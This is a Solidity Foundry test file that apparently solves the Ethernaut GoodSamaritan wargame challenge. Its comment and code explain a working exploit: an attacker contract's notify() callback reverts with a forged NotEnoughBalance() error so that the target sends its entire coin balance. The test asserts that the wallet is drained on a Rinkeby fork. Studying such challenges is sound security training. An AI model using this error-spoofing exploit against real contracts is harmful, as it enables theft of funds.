// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/GoodSamaritan.sol";

/*  
    -need to return "NotEnoughBalance()" error to wallet.donate10(msg.sender) call
    -donate10 will hit else {} block and thereby coin.transfer(dest_, 10)
    -coin.transfer() call reverts unless balances[msg.sender] > 10, but msg.sender is the wallet contract in this context so it's fine
    -balances[] will be updated accordingly, and seeing as dest_.isContract() will be true as it will be our malicious contract:
    -INotifyable(dest_).notify() will be called. This is where we inject a reversion to bubble up all the way back to GoodSamaritan and drain the contract.
*/

contract ErrorInjectionTest is Test {
    uint rinkebyFork;
    string RINKEBY_RPC_URL = vm.envString("RINKEBY_RPC_URL");

    function setUp() public {
        rinkebyFork = vm.createFork(RINKEBY_RPC_URL);
    }

    function testInjection() public {
        vm.selectFork(rinkebyFork);
        assertEq(vm.activeFork(), rinkebyFork);

        GoodSamaritan instance = GoodSamaritan(0x31e4BdaC8Ed7Bd2d7d3c28c1BcFc0c7a97c0Aa49);
        Wallet wallet = Wallet(instance.wallet());
        Coin coin = Coin(instance.coin());
        ErrorInjection errorInjection = new ErrorInjection(address(instance));

        errorInjection.inject();

        uint a = coin.balances(address(wallet));
        assertEq(a, 0);
    }
}

contract ErrorInjection is INotifyable {

    GoodSamaritan goodSamaritan;
    Coin coin;
    Wallet wallet;

    error NotEnoughBalance();

    constructor(address $your_ethernaut_instance_here) {
        goodSamaritan = GoodSamaritan($your_ethernaut_instance_here);
        coin = Coin(goodSamaritan.coin());
        wallet = Wallet(goodSamaritan.wallet());
    }

    function inject() public {
        goodSamaritan.requestDonation();
    }

    function notify(uint amount) external {
        if (amount == 10) { 
            revert NotEnoughBalance(); 
        } else {
            return;
        }
    }
}